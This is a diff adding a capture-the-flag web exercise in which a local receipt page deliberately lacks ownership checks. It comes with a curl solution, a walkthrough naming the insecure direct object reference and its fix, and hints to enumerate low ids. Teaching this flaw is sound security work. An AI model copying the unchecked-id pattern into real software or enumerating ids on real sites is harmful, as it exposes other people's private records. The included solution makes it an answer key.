@@ -1,0 +1,61 @@
+title: Someone else's receipt
+level: Intermediate
+kind: Web
+topic: Web
+teaser: change the number, see what you shouldn't
+points: 65
+order: 42
+packages: httpd
+answer: flag
+var: MYID = num:1000-1200
+var: HID = num:1-40
+
+@intro
+An order-tracking page shows your receipt at
+http://localhost/receipt?id={{MYID}}. The site trusts whatever id you ask for and
+never checks that the order is yours. One of the other orders is marked confidential
+and holds the flag. Find it. (The staff order is a low number.)
+
+@setup
+systemctl enable --now httpd
+
+@web
+[
+  { "path": "/receipt", "kind": "idor", "param": "id", "title": "Order receipt",
+    "records": [
+      ["{{MYID}}", "Your order", "2 loaves, 1 coffee", "status: shipped"],
+      ["{{HID}}", "CONFIDENTIAL staff order", "flag: {{FLAG}}"],
+      ["17", "Order 17", "6 bagels"],
+      ["42", "Order 42", "1 cake"]
+    ],
+    "want": "{{HID}}" }
+]
+
+@solution
+curl -s "http://localhost/receipt?id={{MYID}}"
+curl -s "http://localhost/receipt?id={{HID}}"
+
+@walkthrough
+Your own receipt loads fine:
+
+    curl -s "http://localhost/receipt?id={{MYID}}"
+
+The id in the address is just a number, and the site never checks the order belongs to
+you (an "insecure direct object reference"). Lower numbers are older, staff-created
+orders. Asking for a small id:
+
+    curl -s "http://localhost/receipt?id={{HID}}"
+
+returns the confidential staff order with the flag. The fix is an authorization check:
+the server must confirm the order belongs to the signed-in user before showing it.
+
+@hint 5
+Look at the address of your own receipt. If a number in it identifies the record, ask: what happens if I change it? A safe site checks each request is yours; a careless one doesn't.
+
+@hint 10
+The id in the URL is just a number, and nothing checks it is yours. Try other numbers,
+especially small ones (older, staff orders).
+
+@hint 20
+Request the low ids one at a time: curl -s "http://localhost/receipt?id=N". One is
+marked CONFIDENTIAL and holds the flag.
